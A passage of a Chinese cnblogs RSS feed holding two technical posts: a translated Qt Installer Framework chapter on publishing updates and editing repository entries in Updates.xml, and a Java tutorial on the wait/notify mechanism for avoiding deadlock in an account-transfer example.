&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/uoyo/1635918/o_200119094216QQ%E6%88%AA%E5%9B%BE20200119174042.png&quot; alt=&quot;x&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 07:41:00 +0000</pubDate>
<dc:creator>句幽</dc:creator>
<og:description>【五分钟的dotnet】是一个利用您的碎片化时间来学习和丰富.net知识的博文系列。如果您现在正在使用.NetCore的话，相信您对await 和 async这两个关键字再熟悉不过了。它们是为异步编程</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/uoyo/p/12232261.html</dc:identifier>
</item>
<item>
<title>Qt Installer Framework翻译(5-3) - codeForFamily</title>
<link>http://www.cnblogs.com/codeForFamily/p/qt-install-framework-translate-5-3.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/codeForFamily/p/qt-install-framework-translate-5-3.html</guid>
<description>&lt;p&gt;创建在线安装程序，以便能够向安装产品的用户推广更新。&lt;/p&gt;
&lt;p&gt;为了推广更新，需要执行以下步骤：&lt;/p&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将待更新内容复制到package文件夹。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;在package.xml文件中增加待更新组件的元素的值。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;使用&lt;strong&gt;repogen&lt;/strong&gt;工具重新创建具有待更新内容的联机存储库，并在存储库的根目录中生成Updates.xml文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;将存储库上传到Web服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;使用binarycreator工具创建安装程序。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;配置更新&quot;&gt;配置更新&lt;/h2&gt;
&lt;p&gt;安装程序在启动时会下载Updates.xml文件，并拿该文件中的版本号与已安装的版本号进行比对。如果该文件中的在线版本号更大，则安装程序会在可用更新列表中显示该组件。&lt;/p&gt;
&lt;p&gt;在package.xml文件中增加组件的元素的值。&lt;/p&gt;
&lt;h2 id=&quot;重新创建存储库&quot;&gt;重新创建存储库&lt;/h2&gt;
&lt;p&gt;提供更新的最简单方法是重新创建存储库，并将其上传到Web服务器。有关更多信息，请参见&lt;strong&gt;创建存储库&lt;/strong&gt;章节。&lt;/p&gt;
&lt;h2 id=&quot;存储库部分更新&quot;&gt;存储库部分更新&lt;/h2&gt;
&lt;p&gt;以下情况，完整更新整个存储库可能不是最佳选择：&lt;/p&gt;
&lt;p&gt;&amp;gt; 该存储库非常大，上传需要很长时间。&lt;br/&gt;&amp;gt; 您只想交付更改的组件。&lt;br/&gt;&lt;strong&gt;注意&lt;/strong&gt;：repogen每次被调用时都会重新创建多个7zip存档。7zip存储所包含文件的时间戳（在此过程中，文件可能会被移动或复制），因此每个存档的SHA值的和都会发生变化。 所有SHA值的总和用于验证下载的存档是否被篡改，因此SHA需要与7zip匹配起来。由于SHA值的总和存放在Updates.xml文件中，因此您将被迫上传整个存储库。可以通过使用repogen的&lt;strong&gt;--update&lt;/strong&gt;选项来避免这种情况。&lt;/p&gt;
&lt;h3 id=&quot;创建部分更新&quot;&gt;创建部分更新&lt;/h3&gt;
&lt;p&gt;重新创建在线存储库时，请使用&lt;strong&gt;--update&lt;/strong&gt;参数。它以现有存储库作为输入，仅更改附加参数指定的组件。全局配置中也仅更改那些组件的SHA值的和。&lt;/p&gt;
&lt;h3 id=&quot;上传部分更新&quot;&gt;上传部分更新&lt;/h3&gt;
&lt;p&gt;将以下项目上传到Web服务器：&lt;/p&gt;
&lt;p&gt;&amp;gt; 组件目录（通常类似于com.vendor.product.updatedpart）。&lt;br/&gt;&amp;gt; 存储在联机存储库的根目录中的全局Updates.xml。&lt;br/&gt;&lt;strong&gt;注意&lt;/strong&gt;：上传的顺序非常重要。如果在实时服务器上更新存储库，请首先更新组件，然后更新Updates.xml。包名称包含版本号，因此，用户在新的包完全上传之前，会收到旧的包。&lt;/p&gt;
&lt;h2 id=&quot;变更储存库&quot;&gt;变更储存库&lt;/h2&gt;
&lt;p&gt;要使当前更新用存储库指向其他存储库，请在当前存储库中编辑Updates.xml文件。您可以添加，替换或删除存储库。&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;RepositoryUpdate&amp;gt;
  &amp;lt;Repository action=&quot;...&quot; OPTIONS /&amp;gt;
  &amp;lt;Repository action=&quot;...&quot; OPTIONS /&amp;gt;
&amp;lt;/RepositoryUpdate&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;添加存储库&quot;&gt;添加存储库&lt;/h3&gt;
&lt;p&gt;要更新存储库，请使用以下选项将子元素添加到元素中：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Repository action=&quot;add&quot; url=&quot;http://www.example.com/repository&quot; name=&quot;user&quot; password=&quot;password&quot; displayname=&quot;Example Repository&quot; /&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;url&lt;/strong&gt;元素将作为绝对URL来解析&lt;strong&gt;Updates.xml&lt;/strong&gt;文件。如果url本身是相对的，它将在当前文档的绝对URL的基础上进行解析。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;displayname&lt;/strong&gt;用于在维护工具的“设置”页面中命名存储库。&lt;/p&gt;
&lt;p&gt;名称和密码（可选）在受保护存储库中指定验证凭证。&lt;/p&gt;
&lt;h3 id=&quot;删除存储库&quot;&gt;删除存储库&lt;/h3&gt;
&lt;p&gt;要删除存储库，请使用以下选项将子元素添加到元素中：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Repository action=&quot;remove&quot; url=&quot;http://www.example.com/repository&quot; /&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;url必须与要删除的存储库URL完全匹配。&lt;/p&gt;
&lt;h3 id=&quot;更换储存库&quot;&gt;更换储存库&lt;/h3&gt;
&lt;p&gt;要将一个存储库替换为另一个，请使用以下选项将子元素添加到元素中：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Repository action=&quot;replace&quot; oldUrl=&quot;http://www.example.com/repository&quot; newUrl=&quot;http://www.example.com/newrepository&quot; name=&quot;user&quot; password=&quot;password&quot; displayname=&quot;New Example Repository&quot; /&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;oldUrl必须与要被替换的存储库URL完全匹配。&lt;/p&gt;
&lt;p&gt;newUrl必须与要进行替换的存储库URL完全匹配。&lt;/p&gt;
&lt;h2 id=&quot;重定位存储库&quot;&gt;重定位存储库&lt;/h2&gt;
&lt;p&gt;一些项目包含多个存储库。要创建可重定位的存储库集，您应该使用相对路径。&lt;/p&gt;
&lt;p&gt;因此，如果地址为http://www.example.com/repositories/generic的基础存储库可用，斌且Updates.xml包含具有以下选项的元素：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Repository action=&quot;add&quot; url=&quot;../module&quot; name=&quot;user&quot; password=&quot;password&quot; displayname=&quot;Module Repository&quot; /&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样，添加的存储库的解析地址将变为http://www.example.com/repositories/module，以便该存储库不包含有关其绝对位置的信息。&lt;/p&gt;
&lt;p&gt;如果要更改地址，只需按原样复制存储库集即可。 建议将旧的存储库保留一段时间，并如上所述替换新的地址。 您还可以为更新程序提供新的基础地址。&lt;/p&gt;
&lt;p&gt;您可以在元素中为参数&lt;strong&gt;url&lt;/strong&gt;，&lt;strong&gt;oldUrl&lt;/strong&gt;和&lt;strong&gt;newUrl&lt;/strong&gt;使用相对路径。&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 06:52:00 +0000</pubDate>
<dc:creator>codeForFamily</dc:creator>
<og:description>推广更新 创建在线安装程序，以便能够向安装产品的用户推广更新。 为了推广更新，需要执行以下步骤： 1. 将待更新内容复制到package文件夹。 2. 在package.xml文件中增加待更新组件的元</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/codeForFamily/p/qt-install-framework-translate-5-3.html</dc:identifier>
</item>
<item>
<title>【Java并发基础】使用“等待—通知”机制优化死锁中占用且等待解决方案 - sakuraxx</title>
<link>http://www.cnblogs.com/myworld7/p/12231936.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/myworld7/p/12231936.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;在前篇介绍&lt;a href=&quot;https://www.cnblogs.com/myworld7/p/12230010.html&quot;&gt;死锁&lt;/a&gt;的文章中，我们破坏等待占用且等待条件时，用了一个死循环来获取两个账本对象。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 一次性申请转出账户和转入账户，直到成功
while(!actr.apply(this, target))
  ；&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们提到过，如果apply()操作耗时非常短，且并发冲突量也不大，这种方案还是可以。否则的话，就可能要循环上万次才可以获取锁，这样的话就太消耗CPU了！&lt;/p&gt;
&lt;p&gt;于是我们给出另一个更好的解决方案，&lt;strong&gt;等待-通知机制&lt;/strong&gt;：&lt;br/&gt;若是线程要求的条件不满足，则线程阻塞自己，进入&lt;strong&gt;等待&lt;/strong&gt;状态；当线程要求的条件满足时，&lt;strong&gt;通知&lt;/strong&gt;等待的线程重新执行。&lt;/p&gt;
&lt;p&gt;Java是支持这种等待-通知机制的，下面我们就来详细介绍这个机制，并用这个机制来优化我们的转账流程。&lt;br/&gt;我们先通过一个就医流程来了解一个完善的“等待-通知”机制。&lt;/p&gt;
&lt;h2 id=&quot;就医流程完整的等待通知机制&quot;&gt;就医流程—完整的“等待—通知”机制&lt;/h2&gt;
&lt;p&gt;在医院就医的流程基本是如下这样：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;患者先去挂号，然后到就诊门口分诊，等待叫号；&lt;/li&gt;
&lt;li&gt;当叫到自己的号时，患者就可以找医生就诊；&lt;/li&gt;
&lt;li&gt;就诊过程中，医生可能会让患者去做检查，同时叫一位患者；&lt;/li&gt;
&lt;li&gt;当患者做完检查后，拿着检查单重新分诊，等待叫号；&lt;/li&gt;
&lt;li&gt;当医生再次叫到自己时，患者就再去找医生就诊。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;我们将上述过程对应到线程的运行情况：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;患者到就诊门口分诊，类似于线程要去获取互斥锁；&lt;/li&gt;
&lt;li&gt;当患者被叫到号时，类似于线程获取到了锁；&lt;/li&gt;
&lt;li&gt;医生让患者去做检查（缺乏检查报告不能诊断病因），类似于线程要求的条件没有满足；&lt;br/&gt;患者去做检查，类似于线程进入了等待状态；然后医生叫下一个患者，意味着线程释放了持有的互斥锁；&lt;/li&gt;
&lt;li&gt;患者做完检查，类似于线程要求的条件已经满足；患者拿着检查报告重新分诊，类似于线程需要重新获取互斥锁。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;一个完整的“等待—通知”机制如下：&lt;br/&gt;&lt;span&gt;线程首先获取互斥锁，当线程要求条件不满足时，&lt;strong&gt;释放互斥锁&lt;/strong&gt;，进入&lt;strong&gt;等待&lt;/strong&gt;状态；当条件满足时，&lt;strong&gt;通知等待的线程，重新获取锁&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一定要理解每一个关键点，还需要注意，&lt;span&gt;通知的时候虽然条件满足了，但是不代表该线程再次获取到锁时，条件还是满足的。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;java中等待通知机制的实现&quot;&gt;Java中“等待—通知”机制的实现&lt;/h2&gt;
&lt;p&gt;在Java中，等待—通知机制可以有多种实现，这里我们讲解由&lt;code&gt;synchronized&lt;/code&gt;配合&lt;code&gt;wait()&lt;/code&gt;、&lt;code&gt;notify()&lt;/code&gt;或者&lt;code&gt;notifyAll()&lt;/code&gt;的实现。&lt;/p&gt;
&lt;h3 id=&quot;如何使线程等待wait&quot;&gt;如何使线程等待，wait()&lt;/h3&gt;
&lt;p&gt;当线程进入获取锁进入同步代码块后，若是条件不满足，我们便调用&lt;code&gt;wait()&lt;/code&gt;方法&lt;strong&gt;使得当前线程被阻塞且释放锁&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/202001/1099419-20200124104917979-1947486581.png&quot; width=&quot;700&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上图中的等待队列和互斥锁是一一对应的，每个互斥锁都有自己的独立的等待队列（等待队列是同一个）。（这句话还在暗示我们后面唤醒线程时，是唤醒对应锁上的线程。）&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;如何唤醒线程notifynotifyall&quot;&gt;如何唤醒线程，notify()/notifyAll()&lt;/h3&gt;
&lt;p&gt;当条件满足时，我们调用&lt;code&gt;notify()&lt;/code&gt;或者&lt;code&gt;notifyAll()&lt;/code&gt;，通知等待队列（&lt;strong&gt;互斥锁的等待队列&lt;/strong&gt;）中的线程，告诉它&lt;strong&gt;条件曾经满足过&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1099419/202001/1099419-20200124104951564-179874386.png&quot; width=&quot;700&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们要在相应的锁上使用wait() 、notify()和notifyAll()。&lt;br/&gt;&lt;span&gt;需要注意，这三个方法可以被调用的前提是我们已经获取到了相应的互斥锁。所以，我们会发现wait() 、notify() notifyAll()都是在&lt;code&gt;synchronized{...}&lt;/code&gt;内部中被调用的。如果在synchronized外部调用，JVM会抛出异常：&lt;code&gt;java.lang.IllegalMonitorStateException。&lt;/code&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;使用等待-通知机制重写转账&quot;&gt;使用“等待-通知”机制重写转账&lt;/h2&gt;
&lt;p&gt;我们现在使用“等待—通知”机制来优化上篇的一直循环获取锁的方案。首先我们要清楚如下如下四点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;互斥锁：账本管理员Allocator是单例，所以我们可以使用this作为互斥锁；&lt;/li&gt;
&lt;li&gt;线程要求的条件：转出账户和转入账户都存在，没有被分配出去；&lt;/li&gt;
&lt;li&gt;何时等待：线程要求的条件不满足则等待；&lt;/li&gt;
&lt;li&gt;何时通知：当有线程归还账户时就通知；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;使用“等待—通知”机制时，我们一般会套用一个“范式”，可以看作是前人的经验总结用法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;while(条件不满足) {
    wait();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个范式可以解决“条件曾将满足过”这个问题。因为当wait()返回时，条件已经发生变化，使用这种结构就可以检验条件是否还满足。&lt;/p&gt;
&lt;p&gt;解决我们的转账问题：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Allocator {
    private List&amp;lt;Object&amp;gt; als;
    // 一次性申请所有资源
    synchronized void apply(Object from, Object to){
        // 经典写法
        while(als.contains(from) || als.contains(to)){ 
            // from 或者 to账户被其他线程拥有
            try{
                wait(); // 条件不满足时阻塞当前线程
            }catch(Exception e){
            }   
        }
        als.add(from);
        als.add(to);  
    }
    // 归还资源
    synchronized void free(
        Object from, Object to){
        als.remove(from);
        als.remove(to);
        notifyAll();   // 归还资源，唤醒其他所有线程
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;一些需要注意的问题&quot;&gt;一些需要注意的问题&lt;/h2&gt;
&lt;h3 id=&quot;sleep和wait的区别&quot;&gt;sleep()和wait()的区别&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sleep()&lt;/code&gt;和&lt;code&gt;wait()&lt;/code&gt;都可以使线程阻塞，但是它们还是有很大的区别：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;wait()方法会使当前线程释放锁，而sleep()方法则不会。&lt;br/&gt;当调用wait()方法后，当前线程会暂停执行，并进入互斥锁的等待队列中，直到有线程调用了notify()或者notifyAll()，等待队列中的线程才会被唤醒，重新竞争锁。&lt;br/&gt;sleep()方法的调用需要指定等待的时间，它让当前正在执行的线程在指定的时间内暂停执行，进入阻塞状态，但是它不会使线程释放锁，这意味其他线程在当前线程阻塞的时候，是不能进入获取锁，执行同步代码的。&lt;/li&gt;
&lt;li&gt;wait()只能在同步方法或者同步代码块中执行，而sleep()可以在任何地方执行。&lt;/li&gt;
&lt;li&gt;使用wait()无需捕获异常，而使用sleep()则必须捕获。&lt;/li&gt;
&lt;li&gt;wait()是Object类的方法，而sleep是Thread的方法。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;为什么waitnotifynotifyall是定义在object中而不是thread中&quot;&gt;为什么wait()、notify()、notifyAll()是定义在Object中，而不是Thread中？&lt;/h3&gt;
&lt;p&gt;wait()、notify()以及notifyAll()它们之间的联系是依靠互斥锁，也就同步锁（&lt;a href=&quot;https://www.cnblogs.com/myworld7/p/12219918.html#_label2_0&quot;&gt;内置锁&lt;/a&gt;），我们前面介绍过，&lt;strong&gt;每个Java对象都可以用作一个实现同步的锁&lt;/strong&gt;，所以这些方法是定义在Object中，而不是Thread中。&lt;/p&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;“等待—通知”机制是一种非常普遍的线程间协作的方式，我们在理解时可以利用生活中的例子去类似，就如上面的就医流程。上文中没有明显说明notify()和notifyAll()的区别，只是在图中标注了一下。我们建议尽量使用notifyAll()，notify() 是会随机地通知等待队列中的一个线程，在极端情况下可能会使某个线程一直处于阻塞状态不能去竞争获取锁导致线程“饥饿”；而 notifyAll() 会通知等待队列中的所有线程，即所有等待的线程都有机会去获取锁的使用权。&lt;/p&gt;
&lt;p&gt;参考：&lt;br/&gt;[1]极客时间专栏王宝令《Java并发编程实战》&lt;br/&gt;[2]Brian Goetz.Tim Peierls. et al.Java并发编程实战[M].北京:机械工业出版社,2016&lt;br/&gt;[3]skywang12345.Java多线程系列--“基础篇”05之 线程等待与唤醒.https://www.cnblogs.com/skywang12345/p/3479224.html&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 02:52:00 +0000</pubDate>
<dc:creator>sakuraxx</dc:creator>
<og:description>前言 在前篇介绍 &amp;quot;死锁&amp;quot; 的文章中，我们破坏等待占用且等待条件时，用了一个死循环来获取两个账本对象。 我们提到过，如果apply()操作耗时非常短，且并发冲突量也不大，这种方案还</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/myworld7/p/12231936.html</dc:identifier>
</item>
</channel>
</rss>